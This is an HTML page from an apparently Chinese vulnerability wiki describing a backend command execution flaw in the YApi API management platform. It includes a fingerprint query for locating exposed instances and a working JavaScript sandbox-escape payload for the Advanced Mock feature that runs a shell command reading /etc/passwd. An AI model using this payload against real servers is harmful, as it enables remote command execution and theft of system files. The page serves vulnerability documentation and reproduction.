@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E5%88%86%E7%B1%BB/YApi%20%E6%8E%A5%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>YApi 接口管理平台 后台命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "YApi \u63a5\u53e3\u7ba1\u7406\u5e73\u53f0 \u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../eGroupWare%20spellchecker.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../eGroupWare%20spellchecker.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        eGroupWare spellchecker.php 远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../YApi%20NoSQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../YApi%20NoSQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        YApi NoSQL注入导致远程命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="yapi">YApi 接口管理平台 后台命令执行漏洞<a class="headerlink" href="#yapi" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>YApi 接口管理平台 后台存在命令执行漏洞，攻击者通过发送特定的请求可执行任意命令获取服务器权限</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>YApi 接口管理平台
+</code></pre></div>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app=&quot;YApi&quot;
+</code></pre></div>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登录页面</p>
+<p><img alt="" src="../images/202202091829002.png" /></p>
+<p>首先需要注册账户并登录</p>
+<p><img alt="" src="../images/202202091829520.png" /></p>
+<p><img alt="" src="../images/202202091829602.png" /></p>
+<p>添加项目，参数任意</p>
+<p>创建后点击 高级Mock 输入如下Payload</p>
+<div class="highlight"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">sandbox</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">;</span><span class="w"> </span><span class="c1">// 获取Context</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">ObjectConstructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="kr">constructor</span><span class="p">;</span><span class="w"> </span><span class="c1">// 获取 Object 对象构造函数</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">FunctionConstructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ObjectConstructor</span><span class="p">.</span><span class="kr">constructor</span><span class="p">;</span><span class="w"> </span><span class="c1">// 获取 Function 对象构造函数</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">myfun</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">FunctionConstructor</span><span class="p">(</span><span class="s1">&#39;return process&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">// 构造一个函数，返回process全局变量</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">myfun</span><span class="p">();</span>
+<span class="nx">mockJson</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;child_process&quot;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s2">&quot;cat /etc/passwd&quot;</span><span class="p">).</span><span class="nx">toString</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="" src="../images/202202091830184.png" /></p>
+<p>预览处点击项目链接</p>
+<p><img alt="" src="../images/202202091830086.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../eGroupWare%20spellchecker.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../eGroupWare%20spellchecker.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        eGroupWare spellchecker.php 远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../YApi%20NoSQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../YApi%20NoSQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        YApi NoSQL注入导致远程命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
